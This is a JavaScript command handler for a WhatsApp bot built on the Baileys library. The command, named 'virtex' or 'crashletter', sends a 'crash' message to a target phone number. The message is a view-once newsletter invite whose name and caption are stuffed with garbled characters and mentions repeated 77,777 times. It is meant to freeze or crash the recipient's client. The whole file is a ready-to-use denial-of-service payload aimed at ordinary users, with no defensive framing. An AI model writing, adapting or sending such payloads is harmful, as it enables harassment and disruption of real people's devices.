import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  let tag = '@' + m.sender.split('@')[0];

  // 🛡️ Solo permite al número del bot usar el comando
  if (m.sender !== conn.user.jid) {
    return m.reply(`⛔ Este comando solo puede ser usado por el número donde está vinculado el bot.`);
  }

  // 🧾 Validar número objetivo
  if (!args[0]) {
    return m.reply(`⚠️ Uso incorrecto\n\n📌 Ejemplo:\n${usedPrefix + command} 521xxxxxxxxxx@s.whatsapp.net`);
  }

  let target = args[0];

  // 💣 VIRTEXT potente
  let virtex = "*🥵 VIRTEXT*\n\n" +
    "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆廷\n" +
    "軎?".repeat(77777) +
    "@1".repeat(77777);

  try {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: '120363319314627296@newsletter',
            newsletterName: virtex,
            jpegThumbnail: '',
            caption: virtex,
            inviteExpiration: Date.now() + 1814400000
          },
          contextInfo: {
            mentionedJid: [target],
            groupMentions: [
              {
                groupJid: '120363319314627296@newsletter',
                groupSubject: virtex
              }
            ]
          }
        }
      }
    }), { userJid: target });

    await conn.relayMessage(target, msg.message, { messageId: msg.key.id });

    await conn.sendMessage(m.chat, { text: `✅ Crash enviado a: ${target}`, mentions: [m.sender] }, { quoted: m });

  } catch (err) {
    console.error(err);
    await conn.sendMessage(m.chat, { text: `❌ Ocurrió un error al enviar el crash.`, mentions: [m.sender] }, { quoted: m });
  }
};

handler.help = ['virtex <número>'];
handler.tags = ['tools'];
handler.command = ['virtex', 'crashletter'];
handler.group = false;

export default handler;